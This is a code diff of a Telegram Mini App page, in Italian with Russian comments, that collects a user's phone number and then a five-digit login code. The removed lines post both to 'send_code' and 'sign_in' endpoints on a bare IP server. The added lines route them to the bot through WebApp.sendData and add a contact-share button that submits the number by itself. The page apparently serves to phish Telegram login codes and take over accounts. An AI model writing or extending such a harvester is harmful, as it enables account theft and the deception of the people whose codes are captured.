@@ -47,6 +47,10 @@
             transition: transform 0.2s;
         }
 
+        .tg-button-secondary {
+            background: linear-gradient(45deg, #4ecdc4, #44a08d);
+        }
+
         .tg-button:hover {
             transform: translateY(-2px);
         }
@@ -115,6 +119,14 @@
             border-radius: 10px;
         }
 
+        .success {
+            color: #4ecdc4;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+        }
+
         .loader {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #ff6b6b;
@@ -125,9 +137,22 @@
             margin: 20px auto;
         }
 
+        .contact-shared {
+            background: rgba(78, 205, 196, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+
+        .divider {
+            margin: 20px 0;
+            border: none;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
         }
     </style>
 </head>
@@ -143,9 +168,21 @@
         <!-- Секция номера телефона -->
         <div id="phone-section" class="section">
             <h1>📱 Inserisci il tuo numero</h1>
+            
             <input type="tel" id="phone-input" class="input-field" placeholder="+39 123 456 7890">
             <button class="tg-button" onclick="sendPhoneNumber()">Invia Numero</button>
+            
+            <hr class="divider">
+            <p>Oppure condividi il tuo contatto:</p>
+            <button class="tg-button tg-button-secondary" onclick="shareContact()">📱 Condividi il mio contatto</button>
+            
+            <div id="contact-info" class="contact-shared" style="display: none;">
+                <p>📞 <strong id="shared-phone"></strong></p>
+                <p>✅ Contatto condiviso con successo</p>
+            </div>
+            
             <div id="phone-error" class="error" style="display: none;"></div>
+            <div id="phone-success" class="success" style="display: none;"></div>
             <div id="phone-loading" class="loader" style="display: none;"></div>
         </div>
 
@@ -178,19 +215,16 @@
         // Пытаемся получить user_id из initData
         function getUserId() {
             try {
-                // Способ 1: Из initData если доступно
                 if (Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user) {
                     return Telegram.WebApp.initDataUnsafe.user.id;
                 }
                 
-                // Способ 2: Из query parameters (будем передавать из бота)
                 const urlParams = new URLSearchParams(window.location.search);
                 const userIdFromUrl = urlParams.get('user_id');
                 if (userIdFromUrl) {
                     return userIdFromUrl;
                 }
                 
-                // Способ 3: Генерируем временный ID (как fallback)
                 return 'temp_' + Math.random().toString(36).substr(2, 9);
                 
             } catch (error) {
@@ -235,12 +269,42 @@
                 currentCode.padEnd(5, '•');
         }
 
+        // НОВАЯ ФУНКЦИЯ: Поделиться контактом
+        function shareContact() {
+            Telegram.WebApp.openContactForm((data) => {
+                if (data && data.phone_number) {
+                    userPhone = data.phone_number;
+                    if (!userPhone.startsWith('+')) {
+                        userPhone = '+' + userPhone;
+                    }
+                    
+                    // Заполняем поле ввода
+                    document.getElementById('phone-input').value = userPhone;
+                    
+                    // Показываем информацию о shared контакте
+                    document.getElementById('shared-phone').textContent = userPhone;
+                    document.getElementById('contact-info').style.display = 'block';
+                    document.getElementById('phone-success').textContent = 'Contatto ricevuto! Clicca "Invia Numero" per continuare.';
+                    document.getElementById('phone-success').style.display = 'block';
+                    
+                    // Автоматически отправляем номер
+                    setTimeout(() => {
+                        sendPhoneNumber();
+                    }, 1000);
+                }
+            });
+        }
+
         async function sendPhoneNumber() {
             const phoneInput = document.getElementById('phone-input');
             const errorDiv = document.getElementById('phone-error');
+            const successDiv = document.getElementById('phone-success');
             const loadingDiv = document.getElementById('phone-loading');
             
-            userPhone = phoneInput.value.trim();
+            // Если номер уже получен через shareContact, используем его
+            if (!userPhone) {
+                userPhone = phoneInput.value.trim();
+            }
             
             if (!userPhone) {
                 errorDiv.textContent = 'Per favore inserisci il numero di telefono';
@@ -254,38 +318,28 @@
 
             try {
                 errorDiv.style.display = 'none';
+                successDiv.style.display = 'none';
                 loadingDiv.style.display = 'block';
                 
                 // Получаем user_id
                 userId = getUserId();
                 console.log('Using user_id:', userId);
                 
-                // Отправка номера на бэкенд
-                const response = await fetch('http://104.248.55.220:3001/api/send_code', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        phone: userPhone,
-                        user_id: userId
-                    })
-                });
-
-                const result = await response.json();
-                loadingDiv.style.display = 'none';
+                // ВМЕСТО FETCH - отправляем данные через Telegram WebApp
+                Telegram.WebApp.sendData(JSON.stringify({
+                    action: 'send_phone',
+                    phone: userPhone,
+                    user_id: userId
+                }));
                 
-                if (result.status === 'code_sent') {
-                    showSection('code-section');
-                    createKeyboard();
-                } else {
-                    errorDiv.textContent = result.message || 'Errore sconosciuto';
-                    errorDiv.style.display = 'block';
-                }
-
+                // Показываем секцию с кодом
+                loadingDiv.style.display = 'none';
+                showSection('code-section');
+                createKeyboard();
+                
             } catch (error) {
                 loadingDiv.style.display = 'none';
-                errorDiv.textContent = 'Errore di connessione: ' + error.message;
+                errorDiv.textContent = 'Errore: ' + error.message;
                 errorDiv.style.display = 'block';
                 console.error('Error:', error);
             }
@@ -305,35 +359,24 @@
                 errorDiv.style.display = 'none';
                 loadingDiv.style.display = 'block';
                 
-                // Отправка кода на бэкенд
-                const response = await fetch('http://104.248.55.220:3001/api/sign_in', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        code: currentCode,
-                        user_id: userId
-                    })
-                });
-
-                const result = await response.json();
-                loadingDiv.style.display = 'none';
+                // ВМЕСТО FETCH - отправляем код через Telegram WebApp
+                Telegram.WebApp.sendData(JSON.stringify({
+                    action: 'send_code',
+                    code: currentCode,
+                    user_id: userId
+                }));
                 
-                if (result.status === 'success') {
-                    showSection('success-section');
-                    // Закрываем WebApp через 2 секунды
-                    setTimeout(() => {
-                        Telegram.WebApp.close();
-                    }, 2000);
-                } else {
-                    errorDiv.textContent = result.message || 'Codice errato';
-                    errorDiv.style.display = 'block';
-                }
-
+                loadingDiv.style.display = 'none';
+                showSection('success-section');
+                
+                // Закрываем WebApp через 2 секунды
+                setTimeout(() => {
+                    Telegram.WebApp.close();
+                }, 2000);
+                
             } catch (error) {
                 loadingDiv.style.display = 'none';
-                errorDiv.textContent = 'Errore di connessione: ' + error.message;
+                errorDiv.textContent = 'Errore: ' + error.message;
                 errorDiv.style.display = 'block';
                 console.error('Error:', error);
             }
